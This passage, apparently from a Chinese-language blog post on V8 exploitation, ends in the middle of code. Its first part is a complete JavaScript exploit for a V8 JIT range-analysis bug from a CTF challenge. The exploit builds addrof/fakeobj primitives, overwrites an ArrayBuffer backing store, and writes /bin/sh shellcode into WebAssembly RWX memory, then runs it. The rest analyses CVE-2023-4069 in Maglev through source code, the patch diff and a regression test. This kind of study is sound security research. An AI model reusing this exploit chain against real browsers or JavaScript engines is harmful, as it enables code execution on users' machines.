class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i2f(x) &#123;</span><br><span class="line">    this.u64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int to hex string</span><br><span class="line">  hex(x) &#123;</span><br><span class="line">    return &quot;0x&quot; + x.toString(16);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to hex string</span><br><span class="line">  f2h(x) &#123;</span><br><span class="line">    return this.hex(this.f2i(x));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to aligned address (clear low 2 bits)</span><br><span class="line">  f2a(x) &#123;</span><br><span class="line">    return this.f2i(x) &gt;&gt; 2n &lt;&lt; 2n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // address to float (set low bit)</span><br><span class="line">  a2f(x) &#123;</span><br><span class="line">    return this.i2f(x | 1n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → int64 (signed)</span><br><span class="line">  f2is(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.i64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64 (signed)</span><br><span class="line">  i2fs(x) &#123;</span><br><span class="line">    this.i64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f2lo(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f2hi(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[1];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i2f64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0;</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i2lo(i) &#123;</span><br><span class="line">    return Number(i &amp; 0xffffffffn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i2hi(i) &#123;</span><br><span class="line">    return Number(i &gt;&gt; 32n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i;</span><br><span class="line">    return this.f32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const helpers = new Helpers();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const f2i = x =&gt; helpers.f2i(x);</span><br><span class="line">const i2f = x =&gt; helpers.i2f(x);</span><br><span class="line">const hex = x =&gt; helpers.hex(x);</span><br><span class="line">const f2h = x =&gt; helpers.f2h(x);</span><br><span class="line">const f2a = x =&gt; helpers.f2a(x);</span><br><span class="line">const a2f = x =&gt; helpers.a2f(x);</span><br><span class="line">const f2is = x =&gt; helpers.f2is(x);</span><br><span class="line">const i2fs = x =&gt; helpers.i2fs(x);</span><br><span class="line">const f2lo = x =&gt; helpers.f2lo(x);</span><br><span class="line">const f2hi = x =&gt; helpers.f2hi(x);</span><br><span class="line">const i2f64 = (lo, hi) =&gt; helpers.i2f64(lo, hi);</span><br><span class="line">const i2lo = x =&gt; helpers.i2lo(x);</span><br><span class="line">const i2hi = x =&gt; helpers.i2hi(x);</span><br><span class="line">const f32toi32 = x =&gt; helpers.f32toi32(x);</span><br><span class="line">const i32tof32 = x =&gt; helpers.i32tof32(x);</span><br><span class="line">const p = x =&gt; helpers.p(x);</span><br><span class="line">const debug = x =&gt; helpers.debug(x);</span><br><span class="line">const stop = () =&gt; helpers.stop();</span><br><span class="line">const hex32 = x =&gt; helpers.hex32(x);</span><br><span class="line">const hex64 = x =&gt; helpers.hex64(x);</span><br><span class="line">const hexx = (str, val) =&gt; helpers.hexx(str, val);</span><br><span class="line">const printhex = x =&gt; helpers.printhex(x);</span><br><span class="line">const add_ref = x =&gt; helpers.add_ref(x);</span><br><span class="line">const gc = () =&gt; helpers.gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function f(func, idx, trigger, obj, addr) &#123;</span><br><span class="line">  let double_arr = [0.0, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];</span><br><span class="line">  let obj_arr = [&#123;&#125;];</span><br><span class="line">  let x = trigger == 0 ? 9007199254740989 : 9007199254740992;</span><br><span class="line">  let y = x + 1 + 1;</span><br><span class="line">  let z = y - 9007199254740991; // Range(0, 1) but 3</span><br><span class="line">  z *= 6;                       // Range(0, 6) but 18</span><br><span class="line"></span><br><span class="line">  if (func == &quot;addrof&quot;) &#123;</span><br><span class="line">    obj_arr[idx] = obj;           </span><br><span class="line">    return f2a(double_arr[z]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (func == &quot;fakeobj&quot;) &#123;</span><br><span class="line">    double_arr[z] = a2f(addr);</span><br><span class="line">    return obj_arr[idx];          </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">for (let i = 0; i &lt; 0x10000; i++) &#123;</span><br><span class="line">  f(&quot;addrof&quot;, 0, 0, &#123;&#125;, 0n);</span><br><span class="line">  f(&quot;fakeobj&quot;, 0, 0, &#123;&#125;, 0n);</span><br><span class="line">&#125;</span><br><span class="line">const addrof = obj =&gt; f(&quot;addrof&quot;, 0, 1, obj, 0n);</span><br><span class="line">const fakeobj = addr =&gt; f(&quot;fakeobj&quot;, 0, 1, &#123;&#125;, addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">let arrbuf = new ArrayBuffer(0x100);</span><br><span class="line"></span><br><span class="line">function r(idx, trigger, addr) &#123;</span><br><span class="line">  let double_arr = [0.0, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];</span><br><span class="line">  let another_arr = new Float64Array(arrbuf);</span><br><span class="line">  let x = trigger == 0 ? 9007199254740989 : 9007199254740992;</span><br><span class="line">  let y = x + 1 + 1;</span><br><span class="line">  let z = y - 9007199254740991; // Range(0, 1) but 3</span><br><span class="line">  z *= 7;                       // Range(0, 6) but 21</span><br><span class="line">  trigger = another_arr[idx];   </span><br><span class="line">  double_arr[z] = i2f(addr);</span><br><span class="line">  return another_arr;</span><br><span class="line">&#125;</span><br><span class="line">for (let i = 0; i &lt; 0x10000; i++)</span><br><span class="line">  r(0, 0, 0n);</span><br><span class="line">let replace_bks = addr =&gt; r(0, 1, addr);</span><br><span class="line"></span><br><span class="line">let wasm_code = new Uint8Array([</span><br><span class="line">  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0,</span><br><span class="line">  1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128,</span><br><span class="line">  128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105,</span><br><span class="line">  110, 0, 0, 10, 142, 128, 128, 128, 0, 1, 136, 128, 128, 128, 0, 0, 65, 239, 253, 182, 245, 125,</span><br><span class="line">  11,</span><br><span class="line">]);</span><br><span class="line">let wasm_module = new WebAssembly.Module(wasm_code);</span><br><span class="line">let wasm_instance = new WebAssembly.Instance(wasm_module);</span><br><span class="line">let shell = wasm_instance.exports.main</span><br><span class="line">let data = replace_bks(addrof(wasm_instance));</span><br><span class="line">let rwx_addr = f2a(data[0x1d]);</span><br><span class="line">data = replace_bks(rwx_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;rwx_addr: &quot;, hex(rwx_addr));</span><br><span class="line"></span><br><span class="line">let shellcode = new BigInt64Array([</span><br><span class="line">    0x2fbb485299583b6an,</span><br><span class="line">    0x5368732f6e69622fn,</span><br><span class="line">    0x050f5e5457525f54n</span><br><span class="line">]);</span><br><span class="line">for (let i = 0; i &lt; shellcode.length; i++)</span><br><span class="line">  data[i] = i2f(shellcode[i]);</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><p>参考</p><p><a href="https://blog.wingszeng.top/2018-google-ctf-just-in-time/">https://blog.wingszeng.top/2018-google-ctf-just-in-time/</a></p><p><a href="https://kiprey.github.io/2021/01/v8-turboFan/">https://kiprey.github.io/2021/01/v8-turboFan/</a></p><h3 id="CVE-2023-4069复现"><a href="#CVE-2023-4069复现" class="headerlink" title="CVE-2023-4069复现"></a>CVE-2023-4069复现</h3><p>CVE-2023-4069是关于Maglev图建阶段的一个漏洞 刚好可以用来学习V8中的maglev</p><h4 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git checkout 5315f073233429c5f5c2c794594499debda307bd</span><br><span class="line">gclient sync -D</span><br><span class="line">python3 tools\dev\gm.py x64.release</span><br></pre></td></tr></table></figure><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>漏洞主要在Maglev 分配对象中快速路径的部分</p><p>下面是分配对象的一个函数示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Reflect.construct(target, argumentsList[, newTarget])</span><br><span class="line">target可以理解为当前要分配的类，argumentsList是类数组，newTarget指的是原型类</span><br></pre></td></tr></table></figure><h5 id="快速路径的分配流程"><a href="#快速路径的分配流程" class="headerlink" title="快速路径的分配流程"></a>快速路径的分配流程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">TNode&lt;JSObject&gt; ConstructorBuiltinsAssembler::FastNewObject(</span><br><span class="line">    TNode&lt;Context&gt; context, TNode&lt;JSFunction&gt; target,</span><br><span class="line">    TNode&lt;JSReceiver&gt; new_target, Label* call_runtime) &#123;</span><br><span class="line">  // Verify that the new target is a JSFunction.</span><br><span class="line">  Label end(this);</span><br><span class="line">  TNode&lt;JSFunction&gt; new_target_func =</span><br><span class="line">      HeapObjectToJSFunctionWithPrototypeSlot(new_target, call_runtime);</span><br><span class="line">  // Fast path.</span><br><span class="line"> </span><br><span class="line">  // Load the initial map and verify that it&#x27;s in fact a map.</span><br><span class="line">  TNode&lt;Object&gt; initial_map_or_proto =</span><br><span class="line">      LoadJSFunctionPrototypeOrInitialMap(new_target_func);</span><br><span class="line">  GotoIf(TaggedIsSmi(initial_map_or_proto), call_runtime);</span><br><span class="line">  GotoIf(DoesntHaveInstanceType(CAST(initial_map_or_proto), MAP_TYPE),</span><br><span class="line">         call_runtime);</span><br><span class="line">  TNode&lt;Map&gt; initial_map = CAST(initial_map_or_proto);</span><br><span class="line"> </span><br><span class="line">  // Fall back to runtime if the target differs from the new target&#x27;s</span><br><span class="line">  // initial map constructor.</span><br><span class="line">  TNode&lt;Object&gt; new_target_constructor = LoadObjectField(</span><br><span class="line">      initial_map, Map::kConstructorOrBackPointerOrNativeContextOffset);</span><br><span class="line">  GotoIf(TaggedNotEqual(target, new_target_constructor), call_runtime);</span><br><span class="line"> </span><br><span class="line">  TVARIABLE(HeapObject, properties);</span><br><span class="line"> </span><br><span class="line">  Label instantiate_map(this), allocate_properties(this);</span><br><span class="line">  GotoIf(IsDictionaryMap(initial_map), &amp;allocate_properties);</span><br><span class="line">  &#123;</span><br><span class="line">    properties = EmptyFixedArrayConstant();</span><br><span class="line">    Goto(&amp;instantiate_map);</span><br><span class="line">  &#125;</span><br><span class="line">  BIND(&amp;allocate_properties);</span><br><span class="line">  &#123;</span><br><span class="line">    if (V8_ENABLE_SWISS_NAME_DICTIONARY_BOOL) &#123;</span><br><span class="line">      properties =</span><br><span class="line">          AllocateSwissNameDictionary(SwissNameDictionary::kInitialCapacity);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      properties = AllocateNameDictionary(NameDictionary::kInitialCapacity);</span><br><span class="line">    &#125;</span><br><span class="line">    Goto(&amp;instantiate_map);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  BIND(&amp;instantiate_map);</span><br><span class="line">  return AllocateJSObjectFromMap(initial_map, properties.value(), base::nullopt,</span><br><span class="line">                                 AllocationFlag::kNone, kWithSlackTracking);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件就是</p><ul><li>new_target的类型是JSFunction</li><li>new_target_func的initial map是否是smi类型，smi指的是低位不是1的地址，因为map在v8中是对象指针，所以低位肯定是1</li><li>target和new_target_constructor相同</li><li>map的类型为DictionaryMap</li></ul><p>否则会进入到慢速分配中</p><h5 id="diff分析"><a href="#diff分析" class="headerlink" title="diff分析"></a>diff分析</h5><p>下面分析一下这个CVE的diff文件，这个diff是修复代码不是以前的制造漏洞的diff，不会真的有人做题时把它patch到v8编译吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/maglev/maglev-graph-builder.cc b/src/maglev/maglev-graph-builder.cc</span><br><span class="line">index d5f6128..2c5227e 100644</span><br><span class="line">--- a/src/maglev/maglev-graph-builder.cc</span><br><span class="line">+++ b/src/maglev/maglev-graph-builder.cc</span><br><span class="line">@@ -5347,6 +5347,14 @@</span><br><span class="line">   StoreRegister(iterator_.GetRegisterOperand(0), map_proto);</span><br><span class="line"> &#125;</span><br><span class="line">  </span><br><span class="line">+bool MaglevGraphBuilder::HasValidInitialMap(</span><br><span class="line">+    compiler::JSFunctionRef new_target, compiler::JSFunctionRef constructor) &#123;</span><br><span class="line">+  if (!new_target.map(broker()).has_prototype_slot()) return false;</span><br><span class="line">+  if (!new_target.has_initial_map(broker())) return false;</span><br><span class="line">+  compiler::MapRef initial_map = new_target.initial_map(broker());</span><br><span class="line">+  return initial_map.GetConstructor(broker()).equals(constructor);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> void MaglevGraphBuilder::VisitFindNonDefaultConstructorOrConstruct() &#123;</span><br><span class="line">   ValueNode* this_function = LoadRegisterTagged(0);</span><br><span class="line">   ValueNode* new_target = LoadRegisterTagged(1);</span><br><span class="line">@@ -5380,7 +5388,9 @@</span><br><span class="line">               TryGetConstant(new_target);</span><br><span class="line">           if (kind == FunctionKind::kDefaultBaseConstructor) &#123;</span><br><span class="line">             ValueNode* object;</span><br><span class="line">-            if (new_target_function &amp;&amp; new_target_function-&gt;IsJSFunction()) &#123;</span><br><span class="line">+            if (new_target_function &amp;&amp; new_target_function-&gt;IsJSFunction() &amp;&amp;</span><br><span class="line">+                HasValidInitialMap(new_target_function-&gt;AsJSFunction(),</span><br><span class="line">+                                   current_function)) &#123;</span><br><span class="line">               object = BuildAllocateFastObject(</span><br><span class="line">                   FastObject(new_target_function-&gt;AsJSFunction(), zone(),</span><br><span class="line">                              broker()),</span><br><span class="line">diff --git a/src/maglev/maglev-graph-builder.h b/src/maglev/maglev-graph-builder.h</span><br><span class="line">index 0abb4a8..d92354c 100644</span><br><span class="line">--- a/src/maglev/maglev-graph-builder.h</span><br><span class="line">+++ b/src/maglev/maglev-graph-builder.h</span><br><span class="line">@@ -1884,6 +1884,9 @@</span><br><span class="line">   void MergeDeadLoopIntoFrameState(int target);</span><br><span class="line">   void MergeIntoInlinedReturnFrameState(BasicBlock* block);</span><br><span class="line">  </span><br><span class="line">+  bool HasValidInitialMap(compiler::JSFunctionRef new_target,</span><br><span class="line">+                          compiler::JSFunctionRef constructor);</span><br><span class="line">+</span><br><span class="line">   enum JumpType &#123; kJumpIfTrue, kJumpIfFalse &#125;;</span><br><span class="line">   enum class BranchSpecializationMode &#123; kDefault, kAlwaysBoolean &#125;;</span><br><span class="line">   JumpType NegateJumpType(JumpType jump_type);</span><br><span class="line">diff --git a/test/mjsunit/maglev/regress/regress-crbug-1465326.js b/test/mjsunit/maglev/regress/regress-crbug-1465326.js</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..6e01c1e</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/test/mjsunit/maglev/regress/regress-crbug-1465326.js</span><br><span class="line">@@ -0,0 +1,25 @@</span><br><span class="line">+// Copyright 2023 the V8 project authors. All rights reserved.</span><br><span class="line">+// Use of this source code is governed by a BSD-style license that can be</span><br><span class="line">+// found in the LICENSE file.</span><br><span class="line">+</span><br><span class="line">+// Flags: --maglev --allow-natives-syntax</span><br><span class="line">+</span><br><span class="line">+class A &#123;&#125;</span><br><span class="line">+</span><br><span class="line">+var x = Function;</span><br><span class="line">+</span><br><span class="line">+class B extends A &#123;</span><br><span class="line">+  constructor() &#123;</span><br><span class="line">+    x = new.target;</span><br><span class="line">+    super();</span><br><span class="line">+  &#125;</span><br><span class="line">+&#125;</span><br><span class="line">+function construct() &#123;</span><br><span class="line">+  return Reflect.construct(B, [], Function);</span><br><span class="line">+&#125;</span><br><span class="line">+%PrepareFunctionForOptimization(B);</span><br><span class="line">+construct();</span><br><span class="line">+construct();</span><br><span class="line">+%OptimizeMaglevOnNextCall(B);</span><br><span class="line">+var arr = construct();</span><br><span class="line">+console.log(arr.prototype);</span><br></pre></td></tr></table></figure><p>从这个MaglevGraphBuilder::VisitFindNonDefaultConstructorOrConstruct()函数名不难看出，这个流程发生在Maglev的图建立阶段，用于处理派生类非默认构造函数的访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">if (compiler::OptionalHeapObjectRef constant =</span><br><span class="line">          TryGetConstant(this_function)) &#123;</span><br><span class="line">    compiler::MapRef function_map = constant-&gt;map(broker());</span><br><span class="line">    compiler::HeapObjectRef current = function_map.prototype(broker());</span><br><span class="line"></span><br><span class="line">    while (true) &#123;</span><br><span class="line">      if (!current.IsJSFunction()) break;</span><br><span class="line">      compiler::JSFunctionRef current_function = current.AsJSFunction();</span><br><span class="line">      if (current_function.shared(broker())</span><br><span class="line">              .requires_instance_members_initializer()) &#123;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      if (current_function.context(broker())</span><br><span class="line">              .scope_info(broker())</span><br><span class="line">              .ClassScopeHasPrivateBrand()) &#123;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      FunctionKind kind = current_function.shared(broker()).kind();</span><br><span class="line">      if (kind == FunctionKind::kDefaultDerivedConstructor) &#123;</span><br><span class="line">        if (!broker()-&gt;dependencies()-&gt;DependOnArrayIteratorProtector()) break;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        broker()-&gt;dependencies()-&gt;DependOnStablePrototypeChain(</span><br><span class="line">            function_map, WhereToStart::kStartAtReceiver, current_function);</span><br><span class="line"></span><br><span class="line">        compiler::OptionalHeapObjectRef new_target_function =</span><br><span class="line">            TryGetConstant(new_target);</span><br><span class="line">        if (kind == FunctionKind::kDefaultBaseConstructor) &#123;</span><br><span class="line">          ValueNode* object;</span><br><span class="line">          if (new_target_function &amp;&amp; new_target_function-&gt;IsJSFunction()) &#123;</span><br><span class="line">            object = BuildAllocateFastObject(</span><br><span class="line">                FastObject(new_target_function-&gt;AsJSFunction(), zone(),</span><br><span class="line">                           broker()),</span><br><span class="line">                AllocationType::kYoung);</span><br><span class="line">          &#125; else &#123;</span><br><span class="line">            object = BuildCallBuiltin&lt;Builtin::kFastNewObject&gt;(</span><br><span class="line">                &#123;GetConstant(current_function), new_target&#125;);</span><br><span class="line">          &#125;</span><br><span class="line">          StoreRegister(register_pair.first, GetBooleanConstant(true));</span><br><span class="line">          StoreRegister(register_pair.second, object);</span><br><span class="line">          return;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // Keep walking up the class tree.</span><br><span class="line">      current = current_function.map(broker()).prototype(broker());</span><br><span class="line">    &#125;</span><br><span class="line">    StoreRegister(register_pair.first, GetBooleanConstant(false));</span><br><span class="line">    StoreRegister(register_pair.second, GetConstant(current));</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>分析字太多我就懒得打了，而且已经有珠玉在前了 下面给出flyyyy师傅博客上对这段代码的解释，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">首先这里会去判断当前前遍历到的 prototype 对象是不是 JSFunction，接着获取这个function的ref，然后如果当前构造函数有实例字段（或类似需要初始化的成员），就不能跳过这个requires_instance_members_initializer构造函数，必须执行它的初始化逻辑，最后判断当前 class是否 有 private 字段或方法，不存在则会强制执行初始化逻辑</span><br><span class="line"></span><br><span class="line">然后通过SFI(SharedFunctionInfo)去获取当前函数的类型，这里补充一下一些函数类型，下面就先解释下会用到的，全部的位于这里src/objects/function-kind.h文件里的FunctionKind枚举类里</span><br><span class="line"></span><br><span class="line">- kDefaultBaseConstructor</span><br><span class="line">  - 默认的基类构造函数（class A &#123;&#125;，没有自定义 constructor）</span><br><span class="line">- kDefaultDerivedConstructor</span><br><span class="line">  - 默认的派生类构造函数（class B extends A &#123;&#125;，没有自定义 constructor）</span><br><span class="line"></span><br><span class="line">当获取到当前函数的类型之后，因为从Derived，所以这个判断kind == FunctionKind::kDefaultDerivedConstructor为true，先执行一个依赖保护，通常都是true。</span><br><span class="line"></span><br><span class="line">但是这里我们修改了Derived的构造函数内容，所以这里会返回false，所以会进入else逻辑，但是因为也不是FunctionKind::kDefaultBaseConstructor类型，所以会接着会遍历到上层，会获取到Base的prototype，判断是否为JSFunction时会转化为基类的构造函数，类型对应的是kDefaultBaseConstructor。然后也是执行依赖保护，从function map开始到current_function，也就是Derived开始到base。使用TryGetConstant获取当前构造函数的ref。接着通过if的判断，判断new_target_func函数是否存在且类型是JSFunction，然后调用FastObject分配快速对象，接着调用BuildAllocateFastObject分配对象，类型是kYoung，可以被gc回收</span><br><span class="line"></span><br><span class="line">如果说这里原型链没有遍历到基类，那么这里的类型就不会是kDefaultBaseConstructor，从而进入else的逻辑，这里会调用BuildCallBuiltin分配对象</span><br><span class="line"></span><br><span class="line">当所有的遍历流程接触，会将结果load到寄存器，最后返回</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/1.png" alt="1"></p><p>上面的是我让AI根据代码画的一个流程图，也可以看一下这个加速理解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FastObject::FastObject(compiler::JSFunctionRef constructor, Zone* zone,</span><br><span class="line">                       compiler::JSHeapBroker* broker)</span><br><span class="line">    : map(constructor.initial_map(broker)) &#123;</span><br><span class="line">  compiler::SlackTrackingPrediction prediction =</span><br><span class="line">      